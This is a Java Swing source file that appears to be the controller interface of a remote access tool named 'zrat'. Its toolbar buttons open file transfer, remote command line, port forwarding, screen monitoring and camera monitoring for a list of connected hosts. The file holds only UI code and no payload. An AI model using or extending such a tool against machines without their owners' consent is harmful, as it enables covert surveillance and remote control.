package com.zrat.client.ui;
import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.Map;

import javax.swing.JButton;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JToolBar;
import javax.swing.SwingConstants;
import javax.swing.SwingUtilities;
import javax.swing.WindowConstants;

import com.sun.java.swing.plaf.nimbus.NimbusLookAndFeel;
import com.zrat.client.controller.CommandService;
import com.zrat.client.controller.CommandServiceImpl;
import com.zrat.client.controller.FileService;
import com.zrat.client.controller.FileServiceImpl;
import com.zrat.client.controller.ScreenService;
import com.zrat.client.controller.ScreenServiceImpl;
import com.zrat.client.ui.model.PortForwardingModel;
import com.zrat.client.ui.model.ServerModel;
import com.zrat.client.util.Utils;


/**
* This code was edited or generated using CloudGarden's Jigloo
* SWT/Swing GUI Builder, which is free for non-commercial
* use. If Jigloo is being used commercially (ie, by a corporation,
* company or business for any purpose whatever) then you
* should purchase a license for each developer using Jigloo.
* Please visit www.cloudgarden.com for details.
* Use of Jigloo implies acceptance of these licensing terms.
* A COMMERCIAL LICENSE HAS NOT BEEN PURCHASED FOR
* THIS MACHINE, SO JIGLOO OR THIS CODE CANNOT BE USED
* LEGALLY FOR ANY CORPORATE OR COMMERCIAL PURPOSE.
*/
public class Client extends javax.swing.JFrame {
	/**
	 * 
	 */
	private static final long serialVersionUID = 1L;
	private MainPanel leftPanel;
	private JButton updateIp;
	private JButton file;
	private JButton command;
	private JButton screen;
	private JButton camera;
	private JButton setup;
	private JButton portForwarding;
	private JToolBar jToolBar;
	private static LinkedHashMap<Integer,ServerModel> servers = new LinkedHashMap<Integer,ServerModel> ();
	private static LinkedHashMap<String,PortForwardingModel> ports = new LinkedHashMap<String,PortForwardingModel> ();
	private static Map<Integer,ScreenFrame> frames = new HashMap<Integer,ScreenFrame>();
	public static ServerModel currentServer;
	public static String password;
	private JPanel statusPanel;
	private UpdateIpFrame updateIpFrame;
	private SetupFrame setupFrame;
	
	public static final String SCREEN_SAVE_DIC="Screen Record";

	{
		//Set Look & Feel
		try {
			NimbusLookAndFeel nl = new NimbusLookAndFeel();
			javax.swing.UIManager.setLookAndFeel(nl);
		} catch(Exception e) {
			e.printStackTrace();
		}
	}
	/**
	* Auto-generated main method to display this JFrame
	*/
	public static void main(String[] args) {
		SwingUtilities.invokeLater(new Runnable() {
			public void run() {
				Client inst = new Client();
				inst.setLocationRelativeTo(null);
				inst.setVisible(true);
			}
		});
	}
	
	public Client() {
		super();
		initGUI();
	}
	
	private void initGUI() {
		try {
			BorderLayout thisLayout = new BorderLayout();
			setDefaultCloseOperation(WindowConstants.DISPOSE_ON_CLOSE);
			getContentPane().setLayout(thisLayout);
			{
				statusPanel = new JPanel();
				getContentPane().add(getStatusPanel(), BorderLayout.SOUTH);
				statusPanel.setPreferredSize(new java.awt.Dimension(650, 14));
			}
			
			{
				jToolBar = new JToolBar();
				getContentPane().add(jToolBar,BorderLayout.NORTH);
				jToolBar.setPreferredSize(new java.awt.Dimension(800, 87));
				{
					updateIp = new JButton(Utils.createImageIcon("icons/updateIp_64.png"));
					updateIp.setVerticalTextPosition(SwingConstants.BOTTOM);
					updateIp.setHorizontalTextPosition(SwingConstants.CENTER);
					jToolBar.add(updateIp);
					updateIp.setText("\u66f4\u65b0IP");
					updateIp.addActionListener(new ActionListener() {
						public void actionPerformed(ActionEvent evt) {
							updateIpFrame.setVisible(true);
						}
					});
				}
				{
					file  = new JButton(Utils.createImageIcon("icons/file_64.png"));
					file.setVerticalTextPosition(SwingConstants.BOTTOM);
					file.setHorizontalTextPosition(SwingConstants.CENTER);
					jToolBar.add(file);
					file.setText("\u6587\u4ef6\u4f20\u8f93");
					file.addActionListener(new ActionListener() {
						@Override
						public void actionPerformed(ActionEvent e) {
							if (isSelected() && Client.currentServer.getFileFrame() == null){
								FileService service = new FileServiceImpl(Client.currentServer.getChannel());
								Client.currentServer.setFileFrame(new FileFrame(service,Client.currentServer.getIp()));
								Client.currentServer.getFileFrame().setVisible(true);
								service.getRoots();
							}
							Client.currentServer.getFileFrame().setVisible(true);
							Client.currentServer.getFileFrame().requestFocus();
						}
					});
				}
				{
					command  = new JButton(Utils.createImageIcon("icons/command_64.png"));
					command.setVerticalTextPosition(SwingConstants.BOTTOM);
					command.setHorizontalTextPosition(SwingConstants.CENTER);
					jToolBar.add(command);
					command.setText("\u547d\u4ee4\u884c");
					command.addActionListener(new ActionListener() {
						
						@Override
						public void actionPerformed(ActionEvent e) {
							if (isSelected() && Client.currentServer.getCommandFrame() == null){
								CommandService service = new CommandServiceImpl(Client.currentServer.getChannel());
								Client.currentServer.setCommandFrame(new CommandFrame(service,Client.currentServer.getIp()));
								Client.currentServer.getCommandFrame().setVisible(true);
							}
							Client.currentServer.getCommandFrame().requestFocus();
						}
					});
				}
				{
					portForwarding  = new JButton(Utils.createImageIcon("icons/forward_64.png"));
					portForwarding.setVerticalTextPosition(SwingConstants.BOTTOM);
					portForwarding.setHorizontalTextPosition(SwingConstants.CENTER);
					jToolBar.add(portForwarding);
					portForwarding.setText("\u7aef\u53e3\u8f6c\u53d1");
					portForwarding.addActionListener(new ActionListener() {
						
						@Override
						public void actionPerformed(ActionEvent e) {
							if (isSelected()){
								new PortForwardingFrame(Client.currentServer).setVisible(true);
							}
						}
					});
				}
				
				
				{
					setup = new JButton(Utils.createImageIcon("icons/setup_64.png"));
					setup.setVerticalTextPosition(SwingConstants.BOTTOM);
					setup.setHorizontalTextPosition(SwingConstants.CENTER);
					jToolBar.add(setup);
					setup.setText("\u914d\u7f6e");
					setup.addActionListener(new ActionListener() {
						public void actionPerformed(ActionEvent evt) {
							setupFrame.setVisible(true);
						}
					});
				}
				{
					screen = new JButton(Utils.createImageIcon("icons/screen_64.png"));
					screen.setVerticalTextPosition(SwingConstants.BOTTOM);
					screen.setHorizontalTextPosition(SwingConstants.CENTER);
					jToolBar.add(screen);
					screen.setText("\u5c4f\u5e55\u76d1\u63a7");
					screen.addActionListener(new ActionListener() {
						public void actionPerformed(ActionEvent evt) {
							if (isSelected() && Client.currentServer.getScreenFrame() == null){
								ScreenService service = new ScreenServiceImpl(Client.currentServer.getChannel());
								Client.currentServer.setScreenFrame(new ScreenFrame(service,Client.currentServer.getIp()));
								Client.currentServer.getScreenFrame().setVisible(true);
								service.startSendScreen();
							}
							Client.currentServer.getScreenFrame().setVisible(true);
							Client.currentServer.getScreenFrame().requestFocus();
						}
					});
				}
				{
					camera = new JButton(Utils.createImageIcon("icons/camera_64.png"));
					camera.setVerticalTextPosition(SwingConstants.BOTTOM);
					camera.setHorizontalTextPosition(SwingConstants.CENTER);
					jToolBar.add(camera);
					camera.setText("\u89c6\u9891\u76d1\u63a7");
					camera.addActionListener(new ActionListener() {
						public void actionPerformed(ActionEvent evt) {
							if (isSelected()){
								
							}
						}
					});
				}
				

			}
			
			{
				leftPanel = new MainPanel();
				getContentPane().add(leftPanel, BorderLayout.CENTER);
			}
			updateIpFrame = new UpdateIpFrame();
			setupFrame = new SetupFrame();
			RatUIManager.setUpdateIpFrame(updateIpFrame);
			RatUIManager.setMainPanel(leftPanel);
			RatUIManager.setTabPane(leftPanel.getMainTabPanel());
			RatUIManager.setStatusPanel(statusPanel);
			RatUIManager.setToolBar(jToolBar);
			pack();
			setSize(800, 600);
		} catch (Exception e) {
		    //add your error handling code here
			e.printStackTrace();
		}
	}
	
	
	public JPanel getStatusPanel() {
		return statusPanel;
	}
	
	public boolean isSelected(){
		if (Client.currentServer == null || !servers.containsKey(Integer.valueOf(Client.currentServer.getId()))){
			JOptionPane.showMessageDialog(this,"请先选择主机");
			return false;
		}else{
			return true;
		}
	}

	public static void removeServer(Integer id){
		if (servers.get(id) !=null){
			ServerModel server = servers.get(id);
			if (Client.currentServer.getId().equals(server.getId())){
				Client.currentServer = null;
			}
			RatUIManager.getTabPane().getServerPanel().getServerTableModel().removeObject(server);
			servers.remove(id);
			
		}
	}
	
	public static void addServer(ServerModel server){
		if (!servers.containsValue(server)){
			servers.put(Integer.valueOf(server.getId()),server);
			RatUIManager.getTabPane().getServerPanel().getServerTableModel().addRow(server);
		}
	}
	
	public static ServerModel getServer(Integer id){
		return servers.get(id);
	}
	
	public static void removePort(String id){
		if (ports.get(id) !=null){
			PortForwardingModel server = ports.get(id);
			RatUIManager.getTabPane().getPortPanel().getPortTableModel().removeObject(server);
			ports.remove(id);
			
		}
	}
	
	public static void addPort(PortForwardingModel model){
		if (!ports.containsValue(model)){
			ports.put(model.getId(),model);
			RatUIManager.getTabPane().getPortPanel().getPortTableModel().addRow(model);
		}
	}
	
	public static PortForwardingModel getPort(String id){
		return ports.get(id);
	}

	public static ScreenFrame getFrame(Integer id) {
		return frames.get(id);
	}

	public static void putFrame(Integer id, ScreenFrame frame) {
		Client.frames.put(id, frame);
	}
	
}
